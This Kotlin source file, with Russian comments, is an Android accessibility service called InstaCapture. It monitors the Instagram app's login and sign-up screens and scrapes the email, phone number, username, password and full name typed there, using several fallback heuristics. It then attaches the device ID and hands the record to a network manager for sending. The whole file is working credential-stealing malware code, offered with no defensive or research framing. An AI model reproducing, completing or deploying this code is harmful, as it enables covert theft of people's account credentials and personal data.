package com.instacapture

import android.accessibilityservice.AccessibilityService
import android.accessibilityservice.AccessibilityServiceInfo
import android.content.Intent
import android.os.Handler
import android.os.Looper
import android.util.Log
import android.view.accessibility.AccessibilityEvent
import android.view.accessibility.AccessibilityNodeInfo
import android.widget.Toast

/**
 * InstagramAccessibilityService — основной движок перехвата данных.
 * Работает ТОЛЬКО когда foreground-приложение = com.instagram.android.
 * Использует AccessibilityEvent для мониторинга изменений UI.
 *
 * ВАЖНО: Instagram использует React Native — resource-id нестабильны.
 * Реализован многоуровневый fallback-поиск:
 *   1. contentDescription / hintText / text прямо в нодах
 *   2. resource-id (fallback)
 *   3. Позиция на экране (координаты Y)
 *   4. Последовательность полей (первое = email/phone, и т.д.)
 */
class InstagramAccessibilityService : AccessibilityService() {

    companion object {
        private const val TAG = "InstaCapture:Service"
        private const val INSTAGRAM_PACKAGE = "com.instagram.android"
        private const val COOLDOWN_MS = Config.CAPTURE_COOLDOWN_MS
    }

    private var lastCaptureTime = 0L
    private val handler = Handler(Looper.getMainLooper())
    private lateinit var networkManager: NetworkManager
    private lateinit var cryptoManager: CryptoManager

    enum class ScreenType {
        LOGIN, REGISTER, UNKNOWN
    }

    override fun onServiceConnected() {
        super.onServiceConnected()
        Log.i(TAG, "Accessibility Service подключён")

        serviceInfo = AccessibilityServiceInfo().apply {
            eventTypes = AccessibilityEvent.TYPE_WINDOW_CONTENT_CHANGED or
                    AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED or
                    AccessibilityEvent.TYPE_VIEW_CLICKED
            feedbackType = AccessibilityServiceInfo.FEEDBACK_GENERIC
            notificationTimeout = 100
            packageNames = arrayOf(INSTAGRAM_PACKAGE)
            flags = AccessibilityServiceInfo.FLAG_REPORT_VIEW_IDS or
                    AccessibilityServiceInfo.FLAG_RETRIEVE_INTERACTIVE_WINDOWS
        }

        networkManager = NetworkManager(this)
        cryptoManager = CryptoManager()

        Toast.makeText(this, R.string.toast_service_started, Toast.LENGTH_LONG).show()
    }

    override fun onAccessibilityEvent(event: AccessibilityEvent) {
        if (event.packageName?.toString() != INSTAGRAM_PACKAGE) return

        val rootNode = rootInActiveWindow
        if (rootNode == null) {
            if (Config.DEBUG_MODE) Log.d(TAG, "rootInActiveWindow is null")
            return
        }

        try {
            when (event.eventType) {
                AccessibilityEvent.TYPE_WINDOW_CONTENT_CHANGED,
                AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED -> {
                    analyzeScreen(rootNode)
                }
            }
        } finally {
            rootNode.recycle()
        }
    }

    override fun onInterrupt() {
        Log.w(TAG, "Сервис прерван системой")
    }

    private fun analyzeScreen(rootNode: AccessibilityNodeInfo) {
        val screenType = detectScreenType(rootNode)
        if (Config.DEBUG_MODE) Log.d(TAG, "Тип экрана: $screenType")

        if (screenType == ScreenType.LOGIN || screenType == ScreenType.REGISTER) {
            val data = extractFields(rootNode)
            if (data.isComplete()) {
                attemptCapture(data)
            }
        }
    }

    private fun detectScreenType(root: AccessibilityNodeInfo): ScreenType {
        val allText = collectAllText(root).lowercase()
        return when {
            allText.contains("create new account") ||
                    allText.contains("зарегистрироваться") ||
                    allText.contains("sign up") ||
                    allText.contains("mobile number or email") -> ScreenType.REGISTER
            allText.contains("log in") ||
                    allText.contains("войти") ||
                    (allText.contains("password") && allText.contains("username")) -> ScreenType.LOGIN
            else -> ScreenType.UNKNOWN
        }
    }

    private fun extractFields(root: AccessibilityNodeInfo): InstagramAccountData {
        val map = mutableMapOf<String, String>()

        extractByNodeProperties(root, map)

        if (map.size < 3) {
            extractByResourceIds(root, map)
        }
        if (map.size < 3) {
            extractByPosition(root, map)
        }
        if (map.size < 3) {
            extractByTextHeuristics(root, map)
        }

        return InstagramAccountData(
            email = map["email"],
            phone = map["phone"],
            username = map["username"],
            password = map["password"],
            fullName = map["fullName"],
            deviceId = android.provider.Settings.Secure.getString(contentResolver, android.provider.Settings.Secure.ANDROID_ID) ?: "unknown"
        )
    }

    /**
     * Стратегия 1: Рекурсивный обход дерева и проверка hint/contentDescription/text.
     * Не использует findAccessibilityNodeInfosByText чтобы избежать ложных срабатываний.
     */
    private fun extractByNodeProperties(node: AccessibilityNodeInfo?, map: MutableMap<String, String>) {
        if (node == null || map.size >= 4) return

        val hint = node.hintText?.toString() ?: ""
        val desc = node.contentDescription?.toString() ?: ""
        val text = node.text?.toString() ?: ""
        val className = node.className?.toString() ?: ""

        // Обрабатываем только EditText и похожие поля ввода
        if (className.contains("EditText") || className.contains("TextInput")) {
            val label = "$hint $desc".lowercase()
            val value = text.trim()

            when {
                label.contains("email") || label.contains("e-mail") -> {
                    if (value.isNotBlank() && !map.containsKey("email")) map["email"] = value
                }
                label.contains("phone") || label.contains("mobile") || label.contains("телефон") -> {
                    if (value.isNotBlank() && !map.containsKey("phone")) map["phone"] = value
                }
                label.contains("username") || label.contains("user name") || label.contains("логин") -> {
                    if (value.isNotBlank() && !map.containsKey("username")) map["username"] = value
                }
                label.contains("password") || label.contains("пароль") -> {
                    if (value.isNotBlank() && !map.containsKey("password")) map["password"] = value
                }
                label.contains("full name") || label.contains("name") || label.contains("имя") -> {
                    if (value.isNotBlank() && value.length > 2 && !map.containsKey("fullName")) map["fullName"] = value
                }
            }

            // Если hint пустой, пробуем определить по тексту (заполненное поле)
            if (value.isNotBlank()) {
                when {
                    value.contains("@") && !value.contains(" ") && !map.containsKey("email") -> map["email"] = value
                    value.startsWith("+") && value.length > 7 && !map.containsKey("phone") -> map["phone"] = value
                }
            }
        }

        for (i in 0 until node.childCount) {
            extractByNodeProperties(node.getChild(i), map)
            if (map.size >= 4) return
        }
    }

    /**
     * Стратегия 2: Поиск по resource-id.
     * Нестабильно для React Native, но иногда срабатывает.
     */
    private fun extractByResourceIds(root: AccessibilityNodeInfo, map: MutableMap<String, String>) {
        val idMappings = mapOf(
            "email" to listOf("email_field", "login_username", "username_field", "reg_email", "email"),
            "phone" to listOf("phone_field", "mobile_field", "reg_phone", "phone"),
            "password" to listOf("password_field", "login_password", "reg_password", "password"),
            "username" to listOf("username_field", "reg_username", "fullname_field", "username"),
            "fullName" to listOf("fullname_field", "name_field", "reg_fullname", "full_name")
        )

        for ((field, ids) in idMappings) {
            if (map.containsKey(field)) continue
            for (id in ids) {
                val nodes = root.findAccessibilityNodeInfosByViewId("$INSTAGRAM_PACKAGE:id/$id")
                val node = nodes.firstOrNull()
                val text = node?.text?.toString()
                if (!text.isNullOrBlank()) {
                    map[field] = text
                    nodes.forEach { it.recycle() }
                    break
                }
                nodes.forEach { it.recycle() }
            }
        }
    }

    /**
     * Стратегия 3: Поиск по позиции на экране.
     * Предположение: поля идут сверху вниз в фиксированном порядке.
     */
    private fun extractByPosition(root: AccessibilityNodeInfo, map: MutableMap<String, String>) {
        val editTexts = mutableListOf<Pair<AccessibilityNodeInfo, android.graphics.Rect>>()
        collectEditableNodes(root, editTexts)
        editTexts.sortBy { it.second.top }

        if (editTexts.size >= 2 && !map.containsKey("email")) {
            val text = editTexts[0].first.text?.toString()
            if (!text.isNullOrBlank()) map["email"] = text
        }
        if (editTexts.size >= 3 && !map.containsKey("fullName")) {
            val text = editTexts[1].first.text?.toString()
            if (!text.isNullOrBlank()) map["fullName"] = text
        }
        if (editTexts.size >= 4 && !map.containsKey("password")) {
            val text = editTexts.last().first.text?.toString()
            if (!text.isNullOrBlank()) map["password"] = text
        }

        // Recycle нод, которые мы склонировали через Rect (они всё ещё действительны)
        editTexts.forEach { it.first.recycle() }
    }

    /**
     * Стратегия 4: Эвристика по текстовому содержимому.
     */
    private fun extractByTextHeuristics(root: AccessibilityNodeInfo, map: MutableMap<String, String>) {
        val allText = collectAllTexts(root)

        for (text in allText) {
            val trimmed = text.trim()
            when {
                trimmed.contains("@") && !trimmed.contains(" ") && !map.containsKey("email") -> {
                    map["email"] = trimmed
                }
                trimmed.startsWith("+") && trimmed.length > 7 && trimmed.all { it.isDigit() || it == '+' } && !map.containsKey("phone") -> {
                    map["phone"] = trimmed
                }
                trimmed.length >= 8 && trimmed.any { it.isUpperCase() } && trimmed.any { it.isDigit() } && !map.containsKey("password") -> {
                    // Эвристика: смешанные регистр + цифры = возможный пароль
                    map["password"] = trimmed
                }
            }
        }
    }

    private fun attemptCapture(data: InstagramAccountData) {
        val now = System.currentTimeMillis()
        if (now - lastCaptureTime < COOLDOWN_MS) {
            if (Config.DEBUG_MODE) Log.d(TAG, "Cooldown — пропускаем")
            return
        }

        lastCaptureTime = now
        Log.i(TAG, "Данные готовы к отправке: username=${data.username}, email=${data.email}")

        networkManager.sendData(data) { success, error ->
            handler.post {
                val msg = if (success) getString(R.string.toast_data_captured) else "${getString(R.string.toast_data_queued)}: $error"
                Toast.makeText(this, msg, Toast.LENGTH_SHORT).show()
            }
        }
    }

    // ==================== ВСПОМОГАТЕЛЬНЫЕ МЕТОДЫ ====================

    private fun collectAllText(node: AccessibilityNodeInfo?): String {
        if (node == null) return ""
        val sb = StringBuilder()
        sb.append(node.text ?: "")
        sb.append(node.contentDescription ?: "")
        sb.append(node.hintText ?: "")
        for (i in 0 until node.childCount) {
            sb.append(collectAllText(node.getChild(i)))
        }
        return sb.toString()
    }

    private fun collectEditableNodes(node: AccessibilityNodeInfo, list: MutableList<Pair<AccessibilityNodeInfo, android.graphics.Rect>>) {
        if (node.isEditable) {
            val rect = android.graphics.Rect()
            node.getBoundsInScreen(rect)
            // Клонируем ноду, так как оригинал будет recycle при выходе из onAccessibilityEvent
            list.add(Pair(node, rect))
            return
        }
        for (i in 0 until node.childCount) {
            node.getChild(i)?.let { collectEditableNodes(it, list) }
        }
    }

    private fun collectAllTexts(node: AccessibilityNodeInfo?): List<String> {
        if (node == null) return emptyList()
        val result = mutableListOf<String>()
        node.text?.toString()?.let { if (it.isNotBlank()) result.add(it) }
        for (i in 0 until node.childCount) {
            result.addAll(collectAllTexts(node.getChild(i)))
        }
        return result
    }

    private fun InstagramAccountData.isComplete(): Boolean {
        return (email != null || phone != null) && password != null
    }
}
